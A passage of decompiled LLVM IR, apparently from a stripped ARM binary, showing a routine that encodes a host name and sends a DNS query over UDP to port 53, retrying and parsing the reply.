  store i32 %v2_eb1c, i32* %r2.global-to-local, align 4
  store i32 %v2_eb10, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v1_eb18, i32* %r3.global-to-local, align 4
  %v2_eb58146 = icmp eq i32 %v1_eb18, 0
  store i1 %v2_eb58146, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* @lr, align 4
  %v1_eb60147 = add i32 %v2_eb1c, -1
  store i32 %v1_eb60147, i32* %r1.global-to-local, align 4
  %tmp116148 = icmp slt i32 %v1_eb18, 1
  br i1 %tmp116148, label %dec_label_pc_eb68, label %dec_label_pc_eb2c

dec_label_pc_eb2c:                                ; preds = %dec_label_pc_eae0, %bb115
  %v0_eb2c151 = phi i32 [ %v1_eb4c, %bb115 ], [ 0, %dec_label_pc_eae0 ]
  %v1_eb38150.off0 = phi i8 [ %extract.t152, %bb115 ], [ 0, %dec_label_pc_eae0 ]
  %v2_eb6c149 = phi i32 [ %v1_eb50, %bb115 ], [ %v2_eb1c, %dec_label_pc_eae0 ]
  %v1_eb2c = load i32, i32* @r5, align 4
  %v2_eb2c = add i32 %v1_eb2c, %v0_eb2c151
  %v3_eb2c = inttoptr i32 %v2_eb2c to i8*
  %v4_eb2c = load i8, i8* %v3_eb2c, align 1
  %v6_eb2c = zext i8 %v4_eb2c to i32
  store i32 %v6_eb2c, i32* %r3.global-to-local, align 4
  %v2_eb30 = icmp eq i8 %v4_eb2c, 0
  store i1 %v2_eb30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eb30, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_eb2c
  %v8_eb34 = icmp eq i8 %v4_eb2c, 46
  store i1 %v8_eb34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_eb34, label %.thread, label %.thread7

.thread:                                          ; preds = %dec_label_pc_eb2c, %bb
  %v3_eb38 = load i32, i32* %r6.global-to-local, align 4
  %v4_eb38 = inttoptr i32 %v3_eb38 to i8*
  store i8 %v1_eb38150.off0, i8* %v4_eb38, align 1
  %v0_eb3c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_eb3c.pr, label %.thread9.thread13, label %.thread..thread7_crit_edge

.thread..thread7_crit_edge:                       ; preds = %.thread
  %v1_eb3c.pre = load i32, i32* %r3.global-to-local, align 4
  %v3_eb3c.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v1_eb3c.pre to i8
  br label %.thread7

.thread7:                                         ; preds = %.thread..thread7_crit_edge, %bb
  %v3_eb3c = phi i32 [ %v3_eb3c.pre, %.thread..thread7_crit_edge ], [ %v2_eb6c149, %bb ]
  %v1_eb3c.off0 = phi i8 [ %extract.t, %.thread..thread7_crit_edge ], [ %v4_eb2c, %bb ]
  %v4_eb3c = add i32 %v3_eb3c, -1
  %v5_eb3c = inttoptr i32 %v4_eb3c to i8*
  store i8 %v1_eb3c.off0, i8* %v5_eb3c, align 1
  %v0_eb40.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_eb40.pr, label %.thread9, label %.thread12

.thread9.thread13:                                ; preds = %.thread
  %v1_eb40 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_eb40, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %bb115

.thread9:                                         ; preds = %.thread7
  %v1_eb4011 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_eb4011, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %bb115

.thread12:                                        ; preds = %.thread7
  %v1_eb48 = load i32, i32* @lr, align 4
  %v2_eb48 = urem i32 %v1_eb48, 256
  store i32 %v2_eb48, i32* %r4.global-to-local, align 4
  br label %bb115

bb115:                                            ; preds = %.thread9, %.thread9.thread13, %.thread12
  %v0_eb5c33 = phi i32 [ 0, %.thread9.thread13 ], [ 0, %.thread9 ], [ %v2_eb48, %.thread12 ]
  %v0_eb4c = load i32, i32* %ip.global-to-local, align 4
  %v1_eb4c = add i32 %v0_eb4c, 1
  store i32 %v1_eb4c, i32* %ip.global-to-local, align 4
  %v0_eb50 = load i32, i32* %r2.global-to-local, align 4
  %v1_eb50 = add i32 %v0_eb50, 1
  store i32 %v1_eb50, i32* %r2.global-to-local, align 4
  %v1_eb54.pre = load i32, i32* %r0.global-to-local, align 4
  %v2_eb54 = sub i32 %v1_eb54.pre, %v1_eb4c
  store i32 %v2_eb54, i32* %r3.global-to-local, align 4
  %v2_eb58 = icmp eq i32 %v2_eb54, 0
  store i1 %v2_eb58, i1* %cpsr_z.global-to-local, align 1
  %v1_eb5c = add nuw nsw i32 %v0_eb5c33, 1
  store i32 %v1_eb5c, i32* @lr, align 4
  store i32 %v0_eb50, i32* %r1.global-to-local, align 4
  %tmp116 = icmp slt i32 %v2_eb54, 1
  %extract.t152 = trunc i32 %v0_eb5c33 to i8
  br i1 %tmp116, label %dec_label_pc_eb68, label %dec_label_pc_eb2c

dec_label_pc_eb68:                                ; preds = %bb115, %dec_label_pc_eae0
  %v1_eb60.lcssa = phi i32 [ %v1_eb60147, %dec_label_pc_eae0 ], [ %v0_eb50, %bb115 ]
  store i32 0, i32* @r4, align 4
  %v4_eb6c = inttoptr i32 %v1_eb60.lcssa to i8*
  store i8 0, i8* %v4_eb6c, align 1
  store i32 %v2_eb10, i32* %r0.global-to-local, align 4
  %v1_eb74 = bitcast i32* %stack_var_-2232 to i8*
  %v2_eb74 = call i32 @function_f93c(i8* %v1_eb74)
  %v2_eb78 = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_eb78, i32* %r1.global-to-local, align 4
  %v1_eb7c = load i32, i32* @sb, align 4
  %v2_eb7c = add i32 %v1_eb7c, %v2_eb74
  store i32 %v2_eb7c, i32* @r5, align 4
  %v0_eb84 = load i32, i32* @r4, align 4
  store i32 %v0_eb84, i32* %stack_var_-68, align 4
  store i32 %v2_eb10, i32* %r0.global-to-local, align 4
  %v2_eb94 = call i32 @function_f93c(i8* %v1_eb74)
  %v1_eb98 = add i32 %v2_eb94, 17
  store i32 %v1_eb98, i32* %r0.global-to-local, align 4
  %v0_eba0 = call i32 @function_e7dc()
  %v1_eba0 = sext i32 %v0_eba0 to i64
  store i32 -2147450879, i32* %r3.global-to-local, align 4
  %v5_ebac = mul nuw nsw i64 %v1_eba0, 2147516417
  %v6_ebac = udiv i64 %v5_ebac, 4294967296
  %v7_ebac = trunc i64 %v6_ebac to i32
  %v8_ebac = trunc i64 %v5_ebac to i32
  store i32 %v8_ebac, i32* @lr, align 4
  store i32 %v7_ebac, i32* %r2.global-to-local, align 4
  %v5_ebb04 = udiv i64 %v5_ebac, 140737488355328
  %v5_ebb0 = trunc i64 %v5_ebb04 to i32
  %v6_ebb0 = add i32 %v5_ebb0, %v0_eba0
  store i32 16, i32* %r1.global-to-local, align 4
  %v6_ebbc = urem i32 %v6_ebb0, 65536
  store i32 %v6_ebbc, i32* %ip.global-to-local, align 4
  %v2_ebc4 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_ebc4, i32* %r0.global-to-local, align 4
  %v5_ebc8 = trunc i32 %v6_ebb0 to i16
  %v2_ebcc = call i32 @function_f9d0(i32 %v2_ebc4, i32 16)
  store i32 %v2_ebcc, i32* %r0.global-to-local, align 4
  store i32 13568, i32* %ip.global-to-local, align 4
  store i32 2, i32* %stack_var_-68, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  %v0_ebfc = load i32, i32* @r5, align 4
  %v1_ebfc = add i32 %v0_ebfc, 1
  store i32 %v1_ebfc, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i16 %v5_ebc8, i16* %stack_var_-2244, align 2
  %v4_ec10 = inttoptr i32 %v1_ebfc to i16*
  store i16 256, i16* %v4_ec10, align 2
  %v0_ec14 = load i32, i32* %r3.global-to-local, align 4
  %v1_ec14 = trunc i32 %v0_ec14 to i16
  %v2_ec14 = load i32, i32* %r2.global-to-local, align 4
  %v3_ec14 = add i32 %v2_ec14, 2
  %v4_ec14 = inttoptr i32 %v3_ec14 to i16*
  store i16 %v1_ec14, i16* %v4_ec14, align 2
  store i32 -1, i32* %r6.global-to-local, align 4
  %v2_ecac = ptrtoint i32* %stack_var_-196 to i32
  %v2_ecd4 = ptrtoint i32* %stack_var_-40 to i32
  %v2_ed00 = ptrtoint i32* %stack_var_-52 to i32
  %v2_ed44 = ptrtoint i16* %stack_var_-4292 to i32
  %v2_edd8 = ptrtoint i32* %stack_var_-4280 to i32
  %v1_ede0 = bitcast i32* %stack_var_-4280 to i8*
  %v4_ee04 = zext i16 %tmp79 to i32
  %v2_ee08 = icmp eq i16 %tmp79, 0
  br label %dec_label_pc_ec20

dec_label_pc_ec20:                                ; preds = %dec_label_pc_ed8c, %dec_label_pc_eb68
  %v1_ec24 = phi i32 [ -1, %dec_label_pc_eb68 ], [ %v0_ec20.pre, %dec_label_pc_ed8c ]
  %storemerge = phi i32 [ 1, %dec_label_pc_eb68 ], [ %v1_ed8c, %dec_label_pc_ed8c ]
  store i32 %storemerge, i32* @r8, align 4
  %v7_ec20 = icmp eq i32 %v1_ec24, -1
  store i1 %v7_ec20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec20, label %bb118, label %bb117

bb117:                                            ; preds = %dec_label_pc_ec20
  store i32 %v1_ec24, i32* %r0.global-to-local, align 4
  br label %bb118

bb118:                                            ; preds = %dec_label_pc_ec20, %bb117
  store i32 60460, i32* @lr, align 4
  %v1_ec28 = xor i1 %v7_ec20, true
  call void @__pseudo_cond_branch(i1 %v1_ec28, i32 ptrtoint (i32* @global_var_10608.22 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_ec38 = call i32 @function_10df0(i32 2, i32 2, i32 0)
  store i32 %v3_ec38, i32* %r0.global-to-local, align 4
  %v7_ec3c = icmp eq i32 %v3_ec38, -1
  store i1 %v7_ec3c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_ec38, i32* @r6, align 4
  br i1 %v7_ec3c, label %dec_label_pc_edcc, label %dec_label_pc_ec48

dec_label_pc_ec48:                                ; preds = %bb118
  store i32 %v2_ebc4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_ec54 = call i32 @function_10bd8(i32 %v3_ec38, i32 %v2_ebc4, i32 16)
  store i32 %v3_ec54, i32* %r0.global-to-local, align 4
  %v7_ec58 = icmp eq i32 %v3_ec54, -1
  store i1 %v7_ec58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec58, label %dec_label_pc_ed94, label %dec_label_pc_ec60

dec_label_pc_ec60:                                ; preds = %dec_label_pc_ec48
  %v0_ec60 = load i32, i32* @r6, align 4
  store i32 %v0_ec60, i32* %r0.global-to-local, align 4
  store i32 %v2_eb0c, i32* %r1.global-to-local, align 4
  store i32 %v1_eb98, i32* %r2.global-to-local, align 4
  store i32 16384, i32* @r3, align 4
  %v4_ec70 = call i32 @function_10d34(i32 %v0_ec60, i32 %v2_eb0c, i32 %v1_eb98, i32 16384)
  store i32 %v4_ec70, i32* %r0.global-to-local, align 4
  %v7_ec74 = icmp eq i32 %v4_ec70, -1
  store i1 %v7_ec74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec74, label %dec_label_pc_ed94, label %dec_label_pc_ec7c

dec_label_pc_ec7c:                                ; preds = %dec_label_pc_ec60
  %v0_ec7c = load i32, i32* @r6, align 4
  store i32 %v0_ec7c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_ec88 = call i32 @function_1043c(i32 3, i32 %v0_ec7c)
  %v0_ec8c = load i32, i32* @r6, align 4
  store i32 %v0_ec8c, i32* %r1.global-to-local, align 4
  %v1_ec90 = or i32 %v2_ec88, 2048
  store i32 %v1_ec90, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v2_ec98 = call i32 @function_1043c(i32 4, i32 %v0_ec8c)
  store i32 %v2_ec98, i32* %r0.global-to-local, align 4
  store i32 %v2_eb78, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-196, align 4
  store i32 %v2_ecac, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ecb4

dec_label_pc_ecb4:                                ; preds = %dec_label_pc_ecb4, %dec_label_pc_ec7c
  %v1_ecb8 = phi i32 [ %v1_ecbc, %dec_label_pc_ecb4 ], [ 4, %dec_label_pc_ec7c ]
  store i32 0, i32* @r4, align 4
  %v3_ecb8 = add i32 %v1_ecb8, %v2_ecac
  %v4_ecb8 = inttoptr i32 %v3_ecb8 to i32*
  store i32 0, i32* %v4_ecb8, align 4
  %v0_ecbc = load i32, i32* %r3.global-to-local, align 4
  %v1_ecbc = add i32 %v0_ecbc, 4
  store i32 %v1_ecbc, i32* %r3.global-to-local, align 4
  %v7_ecc0 = icmp eq i32 %v1_ecbc, 128
  br i1 %v7_ecc0, label %dec_label_pc_ecc8, label %dec_label_pc_ecb4

dec_label_pc_ecc8:                                ; preds = %dec_label_pc_ecb4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_ecc8 = load i32, i32* @r6, align 4
  %v3_ecc8 = udiv i32 %v0_ecc8, 32
  %v3_ecd0 = mul nuw nsw i32 %v3_ecc8, 4
  store i32 %v3_ecd0, i32* %r3.global-to-local, align 4
  %v2_ecd8 = add i32 %v3_ecd0, %v2_ecd4
  store i32 %v2_ecd8, i32* @r5, align 4
  %v1_ecdc = add i32 %v2_ecd8, -156
  %v2_ecdc = inttoptr i32 %v1_ecdc to i32*
  %v3_ecdc = load i32, i32* %v2_ecdc, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_ece4 = urem i32 %v0_ecc8, 32
  store i32 %v1_ece4, i32* @r7, align 4
  %v7_ece8 = shl i32 1, %v1_ece4
  %v8_ece8 = or i32 %v3_ecdc, %v7_ece8
  store i32 5, i32* %ip.global-to-local, align 4
  store i32 %v8_ece8, i32* %v2_ecdc, align 4
  %v0_ecf8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_ecf8, i32* %stack_var_-52, align 4
  store i32 %v2_ed00, i32* @lr, align 4
  store i32 %v2_eb78, i32* %ip.global-to-local, align 4
  %v0_ed08 = load i32, i32* @r6, align 4
  %v1_ed08 = load i32, i32* %r3.global-to-local, align 4
  %v2_ed08 = add i32 %v1_ed08, %v0_ed08
  store i32 %v2_ed08, i32* %r0.global-to-local, align 4
  %v0_ed10 = load i32, i32* @r4, align 4
  store i32 %v0_ed10, i32* %r2.global-to-local, align 4
  store i32 %v0_ed10, i32* %r3.global-to-local, align 4
  %v5_ed1c = call i32 @function_102f8(i32 %v2_ed08, i32 %v2_ecac, i32 %v0_ed10, i32 %v0_ed10, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_ed1c, i32* %r0.global-to-local, align 4
  %v7_ed20 = icmp eq i32 %v5_ed1c, -1
  store i1 %v7_ed20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed20, label %dec_label_pc_eda4, label %dec_label_pc_ed28

dec_label_pc_ed28:                                ; preds = %dec_label_pc_ecc8
  %v1_ed28 = load i32, i32* @r4, align 4
  %v9_ed28 = icmp eq i32 %v5_ed1c, %v1_ed28
  store i1 %v9_ed28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ed28, label %dec_label_pc_ed84, label %dec_label_pc_ed30

dec_label_pc_ed30:                                ; preds = %dec_label_pc_ed28
  %v0_ed30 = load i32, i32* @r5, align 4
  %v1_ed30 = add i32 %v0_ed30, -156
  %v2_ed30 = inttoptr i32 %v1_ed30 to i32*
  %v3_ed30 = load i32, i32* %v2_ed30, align 4
  %v1_ed34 = load i32, i32* @r7, align 4
  %v6_ed34 = ashr i32 %v3_ed30, %v1_ed34
  store i32 %v6_ed34, i32* %r3.global-to-local, align 4
  %v1_ed38 = urem i32 %v6_ed34, 2
  %v2_ed38 = icmp eq i32 %v1_ed38, 0
  store i1 %v2_ed38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ed38, label %dec_label_pc_eda4, label %dec_label_pc_ed40

dec_label_pc_ed40:                                ; preds = %dec_label_pc_ed30
  store i32 %v2_ed44, i32* @r5, align 4
  store i32 %v2_ed44, i32* %r1.global-to-local, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ed54 = load i32, i32* @r6, align 4
  store i32 %v0_ed54, i32* %r0.global-to-local, align 4
  %v6_ed60 = call i32 @function_10cf8(i32 %v0_ed54, i32 %v2_ed44, i32 2048, i32 16384, i32 %v1_ed28, i32 %v1_ed28)
  store i32 %v6_ed60, i32* %r4.global-to-local, align 4
  %v0_ed68 = load i32, i32* @sb, align 4
  store i32 %v0_ed68, i32* %r0.global-to-local, align 4
  %v1_ed6c = inttoptr i32 %v0_ed68 to i8*
  %v2_ed6c = call i32 @function_f93c(i8* %v1_ed6c)
  %v1_ed70 = add i32 %v2_ed6c, 17
  store i32 %v1_ed70, i32* %r0.global-to-local, align 4
  %v0_ed74 = load i32, i32* %r4.global-to-local, align 4
  %v3_ed74 = icmp ult i32 %v0_ed74, %v1_ed70
  %v9_ed74 = icmp eq i32 %v0_ed74, %v1_ed70
  store i1 %v9_ed74, i1* %cpsr_z.global-to-local, align 1
  store i32 -4252, i32* @r4, align 4
  br i1 %v3_ed74, label %dec_label_pc_ed84, label %dec_label_pc_edd8

dec_label_pc_ed84:                                ; preds = %dec_label_pc_ed40, %dec_label_pc_edd8, %dec_label_pc_ee04, %dec_label_pc_ed28, %dec_label_pc_edcc
  %v0_ed84 = load i32, i32* @r8, align 4
  %v7_ed84 = icmp eq i32 %v0_ed84, 5
  store i1 %v7_ed84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed84, label %dec_label_pc_eda4, label %dec_label_pc_ed8c

dec_label_pc_ed8c:                                ; preds = %dec_label_pc_ed94, %dec_label_pc_ed84
  %v0_ed8c = phi i32 [ %v0_ed9c, %dec_label_pc_ed94 ], [ %v0_ed84, %dec_label_pc_ed84 ]
  %v1_ed8c = add i32 %v0_ed8c, 1
  %v0_ec20.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_ec20

dec_label_pc_ed94:                                ; preds = %dec_label_pc_ec60, %dec_label_pc_ec48
  %v0_ed94 = phi i32 [ %v4_ec70, %dec_label_pc_ec60 ], [ %v3_ec54, %dec_label_pc_ec48 ]
  %v1_ed94 = add i32 %v0_ed94, 2
  store i32 %v1_ed94, i32* %r0.global-to-local, align 4
  %v1_ed98 = call i32 @function_126fc(i32 %v1_ed94)
  store i32 %v1_ed98, i32* %r0.global-to-local, align 4
  %v0_ed9c = load i32, i32* @r8, align 4
  %v7_ed9c = icmp eq i32 %v0_ed9c, 5
  store i1 %v7_ed9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed9c, label %dec_label_pc_eda4, label %dec_label_pc_ed8c

dec_label_pc_eda4:                                ; preds = %dec_label_pc_ed94, %dec_label_pc_ed84, %dec_label_pc_ed30, %dec_label_pc_ecc8, %dec_label_pc_ee10, %dec_label_pc_ee1c.backedge
  %v0_eda4 = load i32, i32* @r6, align 4
  store i32 %v0_eda4, i32* %r0.global-to-local, align 4
  %v1_eda8 = call i32 @function_10608(i32 %v0_eda4)
  store i32 %v1_eda8, i32* %r0.global-to-local, align 4
  %v0_edac = load i32, i32* @fp, align 4
  %v1_edac = inttoptr i32 %v0_edac to i8*
  %v2_edac = load i8, i8* %v1_edac, align 1
  %v3_edac = zext i8 %v2_edac to i32
  store i32 %v3_edac, i32* @r4, align 4
  %v2_edb0 = icmp eq i8 %v2_edac, 0
  store i1 %v2_edb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_edb0, label %dec_label_pc_eef4, label %dec_label_pc_edb8

dec_label_pc_edb8:                                ; preds = %dec_label_pc_eda4, %dec_label_pc_eef4
  %v0_edb8 = phi i32 [ %v0_edac, %dec_label_pc_eda4 ], [ %v0_ef08, %dec_label_pc_eef4 ]
  store i32 %v0_edb8, i32* %r0.global-to-local, align 4
  store i32 %v3_eae0, i32* @r4, align 4
  store i32 %v9_eae0, i32* %r6.global-to-local, align 4
  store i32 %v12_eae0, i32* @r7, align 4
  store i32 %v27_eae0, i32* @lr, align 4
  ret i32 %v0_edb8

dec_label_pc_edcc:                                ; preds = %bb118
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_edd0 = call i32 @function_126fc(i32 1)
  store i32 %v1_edd0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ed84

dec_label_pc_edd8:                                ; preds = %dec_label_pc_ed40
  store i32 %v2_edd8, i32* @sb, align 4
  store i32 %v2_edd8, i32* %r0.global-to-local, align 4
  %v2_ede0 = call i32 @function_f93c(i8* %v1_ede0)
  %v4_edec = load i16, i16* %stack_var_-4292, align 2
  %v5_edec = sext i16 %v4_edec to i32
  store i32 %v5_edec, i32* %r3.global-to-local, align 4
  store i32 %v6_ebb0, i32* %r1.global-to-local, align 4
  %v1_edf4 = load i32, i32* @sb, align 4
  %v9_edf8 = icmp eq i16 %v4_edec, %v5_ebc8
  store i1 %v9_edf8, i1* %cpsr_z.global-to-local, align 1
  %v2_edf4 = add i32 %v2_ede0, 5
  %v1_edfc = add i32 %v2_edf4, %v1_edf4
  store i32 %v1_edfc, i32* %r0.global-to-local, align 4
  br i1 %v9_edf8, label %dec_label_pc_ee04, label %dec_label_pc_ed84

dec_label_pc_ee04:                                ; preds = %dec_label_pc_edd8
  store i32 %v4_ee04, i32* %r3.global-to-local, align 4
  store i1 %v2_ee08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee08, label %dec_label_pc_ed84, label %dec_label_pc_ee10

dec_label_pc_ee10:                                ; preds = %dec_label_pc_ee04
  %div = udiv i16 %tmp79, 256
  %v3_ee10 = zext i16 %div to i32
  store i32 %v3_ee10, i32* %r2.global-to-local, align 4
  %v1_ee14 = mul nuw nsw i32 %v4_ee04, 256
  %v4_ee18 = and i32 %v1_ee14, 65280
  %v5_ee18 = or i32 %v4_ee18, %v3_ee10
  %v1_ee1c134 = add nsw i32 %v5_ee18, -1
  %v3_ee20135 = mul i32 %v1_ee1c134, 65536
  store i32 %v3_ee20135, i32* %r3.global-to-local, align 4
  %v7_ee24141 = icmp eq i32 %v3_ee20135, -65536
  store i1 %v7_ee24141, i1* %cpsr_z.global-to-local, align 1
  %v3_ee28142 = urem i32 %v1_ee1c134, 65536
  store i32 %v3_ee28142, i32* @r8, align 4
  br i1 %v7_ee24141, label %dec_label_pc_eda4, label %dec_label_pc_ee30

dec_label_pc_ee30:                                ; preds = %dec_label_pc_ee10, %dec_label_pc_ee1c.backedge
  %v3_ee28144 = phi i32 [ %v3_ee28, %dec_label_pc_ee1c.backedge ], [ %v3_ee28142, %dec_label_pc_ee10 ]
  %v0_ee80143 = phi i32 [ %storemerge29, %dec_label_pc_ee1c.backedge ], [ %v1_edfc, %dec_label_pc_ee10 ]
  store i32 %v0_ee80143, i32* %r3.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  store i32 1, i32* %ip.global-to-local, align 4
  %v1_ee3c18 = inttoptr i32 %v0_ee80143 to i8*
  %v2_ee3c19 = load i8, i8* %v1_ee3c18, align 1
  %v3_ee3c20 = zext i8 %v2_ee3c19 to i32
  store i32 %v3_ee3c20, i32* %r2.global-to-local, align 4
  %v2_ee4021 = icmp eq i8 %v2_ee3c19, 0
  store i1 %v2_ee4021, i1* %cpsr_z.global-to-local, align 1
  %v3_ee4422 = mul nuw nsw i32 %v3_ee3c20, 256
  store i32 %v3_ee4422, i32* %r1.global-to-local, align 4
  br i1 %v2_ee4021, label %dec_label_pc_ee78, label %dec_label_pc_ee4c.preheader

dec_label_pc_ee4c.preheader:                      ; preds = %dec_label_pc_ee30, %dec_label_pc_ee3c.backedge
  %v1_ef18 = phi i32 [ %v1_ef1850, %dec_label_pc_ee3c.backedge ], [ 1, %dec_label_pc_ee30 ]
  %v0_ef1048 = phi i32 [ %v0_ef10, %dec_label_pc_ee3c.backedge ], [ 0, %dec_label_pc_ee30 ]
  %v0_ee5846 = phi i32 [ %v3_ee44, %dec_label_pc_ee3c.backedge ], [ %v3_ee4422, %dec_label_pc_ee30 ]
  %v0_ee5444 = phi i32 [ %v1_ef14, %dec_label_pc_ee3c.backedge ], [ %v0_ee80143, %dec_label_pc_ee30 ]
  %v0_ee4c42 = phi i32 [ %v3_ee3c, %dec_label_pc_ee3c.backedge ], [ %v3_ee3c20, %dec_label_pc_ee30 ]
  br label %dec_label_pc_ee4c

dec_label_pc_ee4c:                                ; preds = %dec_label_pc_ee4c.preheader, %dec_label_pc_ee54
  %v0_ef10 = phi i32 [ %v0_ef1048, %dec_label_pc_ee4c.preheader ], [ 1, %dec_label_pc_ee54 ]
  %v0_ee58 = phi i32 [ %v0_ee5846, %dec_label_pc_ee4c.preheader ], [ %v3_ee70, %dec_label_pc_ee54 ]
  %v0_ef14 = phi i32 [ %v0_ee5444, %dec_label_pc_ee4c.preheader ], [ %v2_ee60, %dec_label_pc_ee54 ]
  %v0_ee4c = phi i32 [ %v0_ee4c42, %dec_label_pc_ee4c.preheader ], [ %v3_ee64, %dec_label_pc_ee54 ]
  %v7_ee4c = icmp eq i32 %v0_ee4c, 191
  store i1 %v7_ee4c, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v0_ee4c, 192
  br i1 %tmp, label %dec_label_pc_ef10, label %dec_label_pc_ee54

dec_label_pc_ee54:                                ; preds = %dec_label_pc_ee4c
  %v1_ee54 = add i32 %v0_ef14, 1
  %v2_ee54 = inttoptr i32 %v1_ee54 to i8*
  %v3_ee54 = load i8, i8* %v2_ee54, align 1
  %v4_ee54 = zext i8 %v3_ee54 to i32
  %v2_ee58 = or i32 %v4_ee54, -49152
  %v0_ee60 = load i32, i32* @r5, align 4
  %v1_ee5c = add i32 %v0_ee60, %v0_ee58
  %v2_ee60 = add i32 %v1_ee5c, %v2_ee58
  store i32 %v2_ee60, i32* %r3.global-to-local, align 4
  %v1_ee64 = inttoptr i32 %v2_ee60 to i8*
  %v2_ee64 = load i8, i8* %v1_ee64, align 1
  %v3_ee64 = zext i8 %v2_ee64 to i32
  store i32 %v3_ee64, i32* %r2.global-to-local, align 4
  %v2_ee68 = icmp eq i8 %v2_ee64, 0
  store i1 %v2_ee68, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* @lr, align 4
  %v3_ee70 = mul nuw nsw i32 %v3_ee64, 256
  store i32 %v3_ee70, i32* %r1.global-to-local, align 4
  br i1 %v2_ee68, label %dec_label_pc_ee78, label %dec_label_pc_ee4c

dec_label_pc_ee78:                                ; preds = %dec_label_pc_ee3c.backedge, %dec_label_pc_ee54, %dec_label_pc_ee30
  %v1_ee7c = phi i32 [ 1, %dec_label_pc_ee30 ], [ %v1_ef18, %dec_label_pc_ee54 ], [ %v1_ef1850, %dec_label_pc_ee3c.backedge ]
  %v0_ee78 = phi i32 [ 0, %dec_label_pc_ee30 ], [ 1, %dec_label_pc_ee54 ], [ %v0_ef10, %dec_label_pc_ee3c.backedge ]
  %v7_ee78 = icmp eq i32 %v0_ee78, 1
  store i1 %v7_ee78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee78, label %bb119, label %bb120

bb119:                                            ; preds = %dec_label_pc_ee78
  %v2_ee7c = add i32 %v1_ee7c, 1
  store i32 %v2_ee7c, i32* %ip.global-to-local, align 4
  br label %bb120

bb120:                                            ; preds = %dec_label_pc_ee78, %bb119
  %v1_ee80 = phi i32 [ %v1_ee7c, %dec_label_pc_ee78 ], [ %v2_ee7c, %bb119 ]
  %v2_ee80 = add i32 %v1_ee80, %v0_ee80143
  store i32 %v2_ee80, i32* @r4, align 4
  %v3_ee84 = inttoptr i32 %v2_ee80 to i8*
  %v4_ee84 = load i8, i8* %v3_ee84, align 1
  %v6_ee84 = zext i8 %v4_ee84 to i32
  store i32 %v6_ee84, i32* %r3.global-to-local, align 4
  %v1_ee88 = add i32 %v2_ee80, 1
  %v2_ee88 = inttoptr i32 %v1_ee88 to i8*
  %v3_ee88 = load i8, i8* %v2_ee88, align 1
  %v4_ee88 = zext i8 %v3_ee88 to i32
  store i32 %v4_ee88, i32* %r2.global-to-local, align 4
  %v4_ee8c = mul nuw nsw i32 %v4_ee88, 256
  %v5_ee8c = or i32 %v4_ee8c, %v6_ee84
  store i32 %v5_ee8c, i32* %r3.global-to-local, align 4
  %v7_ee90 = icmp eq i32 %v5_ee8c, 256
  store i1 %v7_ee90, i1* %cpsr_z.global-to-local, align 1
  %v1_ee94 = add i32 %v2_ee80, 10
  store i32 %v1_ee94, i32* @r7, align 4
  br i1 %v7_ee90, label %dec_label_pc_ef30, label %dec_label_pc_ee9c

dec_label_pc_ee9c:                                ; preds = %dec_label_pc_ef30, %bb120
  store i32 %v1_ee94, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_eea824 = inttoptr i32 %v1_ee94 to i8*
  %v2_eea825 = load i8, i8* %v1_eea824, align 1
  %v3_eea826 = zext i8 %v2_eea825 to i32
  store i32 %v3_eea826, i32* %r2.global-to-local, align 4
  %v2_eeac27 = icmp eq i8 %v2_eea825, 0
  store i1 %v2_eeac27, i1* %cpsr_z.global-to-local, align 1
  %v3_eeb028 = mul nuw nsw i32 %v3_eea826, 256
